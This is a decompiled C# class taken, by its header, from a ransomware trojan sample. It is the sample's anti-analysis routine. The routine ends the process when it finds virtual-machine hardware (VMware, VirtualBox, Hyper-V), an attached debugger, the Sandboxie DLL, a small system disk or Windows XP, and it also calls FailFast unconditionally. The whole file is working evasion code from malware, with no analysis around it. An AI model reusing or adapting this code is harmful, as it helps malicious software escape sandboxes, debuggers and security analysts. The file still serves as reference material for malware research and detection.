// Decompiled with JetBrains decompiler
// Type: Complex.Anti_Analysis
// Assembly: Client-2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 10231E92-BCE6-4007-A463-67D77912E754
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.05\HEUR-Trojan-Ransom.Win32.Generic-5d40615701c48a122e44f831e7c8643d07765629a83b15d090587f469c77693d.exe

using Microsoft.VisualBasic.Devices;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;

namespace Complex
{
  internal class Anti_Analysis
  {
    public static void RunAntiAnalysis()
    {
      if (Anti_Analysis.DetectManufacturer() || Anti_Analysis.DetectDebugger() || Anti_Analysis.DetectSandboxie() || Anti_Analysis.IsSmallDisk() || Anti_Analysis.IsXP())
        Process.GetCurrentProcess().Kill();
      Environment.FailFast((string) null);
    }

    private static bool IsSmallDisk()
    {
      try
      {
        long num = 61000000000;
        if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= num)
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool IsXP()
    {
      try
      {
        if (new ComputerInfo().OSFullName.ToLower().Contains("xp"))
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool DetectManufacturer()
    {
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
        {
          using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
          {
            foreach (ManagementBaseObject managementBaseObject in objectCollection)
            {
              string lower = managementBaseObject["Manufacturer"].ToString().ToLower();
              if (lower == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL") || lower.Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
                return true;
            }
          }
        }
      }
      catch
      {
      }
      return false;
    }

    private static bool DetectDebugger()
    {
      bool isDebuggerPresent = false;
      try
      {
        Anti_Analysis.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
        return isDebuggerPresent;
      }
      catch
      {
        return isDebuggerPresent;
      }
    }

    private static bool DetectSandboxie()
    {
      try
      {
        return Anti_Analysis.GetModuleHandle("SbieDll.dll").ToInt32() != 0;
      }
      catch
      {
        return false;
      }
    }

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CheckRemoteDebuggerPresent(
      IntPtr hProcess,
      ref bool isDebuggerPresent);
  }
}
